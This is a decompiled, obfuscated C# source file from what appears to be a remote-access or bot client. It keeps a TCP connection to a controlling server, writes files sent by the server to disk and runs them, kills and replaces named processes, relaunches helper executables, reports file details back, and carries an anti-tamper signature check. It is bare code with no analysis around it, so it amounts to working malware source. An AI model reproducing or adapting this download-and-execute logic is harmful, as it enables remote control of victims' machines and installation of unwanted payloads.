using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ns3;
using ns6;
using ns8;

namespace ns2;

internal sealed class Class1
{
	public Class2 class2_0;

	public DateTime dateTime_0;

	[NonSerialized]
	internal static GetString getString_0;

	public string method_0(string string_0, bool bool_0 = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(string_0);
			string text = fileInfo.Name + ((!bool_0) ? getString_0(107396660).Split(new char[1] { '|' })[0] : getString_0(107396705).Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.ToString() + ((!bool_0) ? getString_0(107396660).Split(new char[1] { '|' })[0] : getString_0(107396705).Split(new char[1] { '|' })[0]);
			text = text + method_4(fileInfo.Length) + ((!bool_0) ? getString_0(107396660).Split(new char[1] { '|' })[0] : getString_0(107396705).Split(new char[1] { '|' })[0]);
			if (!bool_0)
			{
				class2_0.method_1(null, getString_0(107396647).Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return getString_0(107396618);
		}
	}

	public NetworkStream method_1(TcpClient tcpClient_0)
	{
		return tcpClient_0.GetStream();
	}

	public void method_2()
	{
		try
		{
			if (Process.GetProcessesByName(Class11.string_19).Length == 0 && File.Exists(Class11.smethod_5() + Class11.string_19 + getString_0(107396617).Split(new char[1] { '!' })[0]))
			{
				method_15(Class11.smethod_5() + Class11.string_19 + getString_0(107396617).Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public void method_3()
	{
		try
		{
			if (Process.GetProcessesByName(Class11.string_15).Length == 0 && File.Exists(Class11.smethod_0() + Class11.string_15 + getString_0(107396617).Split(new char[1] { '!' })[0]))
			{
				method_15(Class11.smethod_0() + Class11.string_15 + getString_0(107396617).Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	public string method_4(long long_0)
	{
		try
		{
			string[] array = new string[7]
			{
				getString_0(107396632).Split(new char[1] { '!' })[0],
				getString_0(107397099).Split(new char[1] { '!' })[0],
				getString_0(107397118).Split(new char[1] { '!' })[0],
				getString_0(107397073),
				getString_0(107397068),
				getString_0(107397063),
				getString_0(107397090).Split(new char[1] { '!' })[0]
			};
			if (long_0 == 0L)
			{
				return getString_0(107397045) + array[0];
			}
			long num = Math.Abs(long_0);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(long_0) * num3 + array[num2];
		}
		catch
		{
			return getString_0(107396618);
		}
	}

	public void method_5()
	{
		try
		{
			if (Process.GetProcessesByName(Class11.string_7).Length == 0 && File.Exists(Class11.smethod_6() + Class11.string_7 + getString_0(107396617).Split(new char[1] { '!' })[0]))
			{
				method_15(Class11.smethod_6() + Class11.string_7 + getString_0(107396617).Split(new char[1] { '!' })[0].ToString());
			}
		}
		catch
		{
		}
	}

	public Class1(Class2 class2_1)
	{
		class2_0 = class2_1;
	}

	public void method_6()
	{
		try
		{
			if (Process.GetProcessesByName(Class11.string_15).Length == 0 && File.Exists(Class11.smethod_0() + Class11.string_15 + getString_0(107396617).Split(new char[1] { '!' })[0]))
			{
				method_15(Class11.smethod_0() + Class11.string_15 + getString_0(107396617).Split(new char[1] { '!' })[0].ToString());
			}
		}
		catch
		{
		}
	}

	public void method_7()
	{
		try
		{
			if (Process.GetProcessesByName(Class11.string_19).Length == 0 && File.Exists(Class11.smethod_5() + Class11.string_19 + getString_0(107396617).Split(new char[1] { '!' })[0]))
			{
				method_15(Class11.smethod_5() + Class11.string_19 + getString_0(107396617).Split(new char[1] { '!' })[0].ToString());
			}
		}
		catch
		{
		}
	}

	public void method_8()
	{
		DateTime now = DateTime.Now;
		try
		{
			if (Math.Abs(dateTime_0.Subtract(now).Minutes) > 6)
			{
				class2_0.tcpClient_0.Close();
				class2_0.bool_7 = false;
			}
		}
		catch
		{
		}
	}

	public void method_9()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(Class11.string_7);
			if (processesByName.Length == 1)
			{
				method_10(processesByName[0].Id);
			}
			Thread.Sleep(50);
			if (File.Exists(Class11.smethod_6() + Class11.string_7))
			{
				File.Delete(Class11.smethod_6() + Class11.string_7);
				if (File.Exists(Class11.smethod_6() + Class11.string_7 + getString_0(107397040).Split(new char[1] { '|' })[0]))
				{
					File.Delete(Class11.smethod_6() + Class11.string_7 + getString_0(107397040).Split(new char[1] { '|' })[0]);
				}
				Thread.Sleep(150);
				method_5();
			}
		}
		catch
		{
		}
	}

	public void method_10(int int_0)
	{
		try
		{
			Process.GetProcessById(int_0).Kill();
			Thread.Sleep(10);
		}
		catch
		{
		}
	}

	public string[] method_11()
	{
		string @string = Encoding.UTF8.GetString(Class11.byte_1, 0, Class11.byte_1.Length);
		return @string.Split(new char[1] { '?' });
	}

	public void method_12(string string_0, string string_1)
	{
		try
		{
			byte[] array = class2_0.method_16();
			uint num = Class13.smethod_0(string_0);
			if (num <= 2277527002u)
			{
				switch (num)
				{
				default:
					return;
				case 2177855104u:
					if (string_0 == getString_0(107396924) && array != null)
					{
						if (!Directory.Exists(Class11.smethod_2()))
						{
							Directory.CreateDirectory(Class11.smethod_2());
						}
						string text = Class11.smethod_2() + getString_0(107396890).Split(new char[1] { '|' })[0];
						if (!Directory.Exists(text))
						{
							Directory.CreateDirectory(text);
						}
						File.WriteAllBytes(text + Class11.string_8 + getString_0(107396899), array);
						method_15(text + Class11.string_8 + getString_0(107396899).ToString());
						Thread.Sleep(10);
					}
					return;
				case 2100340970u:
					break;
				case 2277527002u:
					if (string_0 == getString_0(107396909) && array != null)
					{
						if (!Directory.Exists(Class11.smethod_8()))
						{
							Directory.CreateDirectory(Class11.smethod_8());
						}
						File.WriteAllBytes(Class11.smethod_8() + Class11.string_5 + getString_0(107396617).Split(new char[1] { '!' })[0], array);
					}
					return;
				case 2236459395u:
					if (string_0 == getString_0(107397010) && array != null)
					{
						File.WriteAllBytes(Class11.smethod_8() + Class11.string_22, array);
					}
					return;
				}
				if (!(string_0 == getString_0(107396962)))
				{
					return;
				}
			}
			else
			{
				if (num > 2372558126u)
				{
					switch (num)
					{
					case 3212799684u:
						if (string_0 == getString_0(107397021) && array != null)
						{
							File.WriteAllBytes(Class11.smethod_8() + Class11.string_21, array);
						}
						break;
					case 2499224954u:
						if (string_0 == getString_0(107396968) && array != null)
						{
							if (!Directory.Exists(Class11.smethod_6()))
							{
								Directory.CreateDirectory(Class11.smethod_6());
							}
							Process[] processesByName = Process.GetProcessesByName(Class11.string_7);
							if (processesByName.Length == 1)
							{
								method_10(processesByName[0].Id);
							}
							File.WriteAllBytes(Class11.smethod_6() + Class11.string_7 + getString_0(107396899), array);
						}
						break;
					}
					return;
				}
				switch (num)
				{
				default:
					return;
				case 2372558126u:
					if (string_0 == getString_0(107397059) && array != null)
					{
						File.WriteAllBytes(Class11.smethod_2() + Class11.string_6, array);
					}
					return;
				case 2297366469u:
					break;
				}
				if (!(string_0 == getString_0(107396983)))
				{
					return;
				}
			}
			if (!Directory.Exists(Class11.smethod_5()))
			{
				Directory.CreateDirectory(Class11.smethod_5());
			}
			if (array != null)
			{
				Process[] processesByName2 = Process.GetProcessesByName(Class11.string_19);
				if (processesByName2.Length == 1)
				{
					method_10(processesByName2[0].Id);
				}
				File.WriteAllBytes(Class11.smethod_5() + Class11.string_19 + getString_0(107396617).Split(new char[1] { '!' })[0], array);
			}
		}
		catch
		{
		}
	}

	public void method_13(string string_0, string string_1)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(string_1);
			string path = string_0 + string_1 + getString_0(107396357).Split(new char[1] { '|' })[0];
			if (processesByName.Length == 1)
			{
				method_10(processesByName[0].Id);
				Thread.Sleep(20);
			}
			if (File.Exists(path))
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
	}

	public void method_14()
	{
		try
		{
			byte[] array = class2_0.method_16();
			if (array != null)
			{
				method_13(Class11.smethod_0(), Class11.string_15);
				method_13(Class11.smethod_6(), Class11.string_7);
				method_13(Class11.smethod_5(), Class11.string_19);
				if (!File.Exists(Class11.smethod_2() + Class11.string_17 + getString_0(107396617).Split(new char[1] { '!' })[0]))
				{
					File.WriteAllBytes(Class11.smethod_2() + Class11.string_17 + getString_0(107396617).Split(new char[1] { '!' })[0], array);
					method_15(Class11.smethod_2() + Class11.string_17 + getString_0(107396899).ToString());
				}
			}
		}
		catch
		{
		}
	}

	public void method_15(string string_0)
	{
		try
		{
			Process.Start(string_0);
		}
		catch
		{
		}
	}

	static Class1()
	{
		Strings.CreateGetStringDelegate(typeof(Class1));
		bool bool_ = false;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Uri uri = new Uri(executingAssembly.CodeBase!.Replace(getString_0(107396796), getString_0(107396791)).Replace(getString_0(107396754), getString_0(107396749)));
		if (!StrongNameSignatureVerificationEx(uri.LocalPath, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith(getString_0(107396744)))
		{
			throw new SecurityException(getString_0(107396719));
		}
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool StrongNameSignatureVerificationEx([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);
}
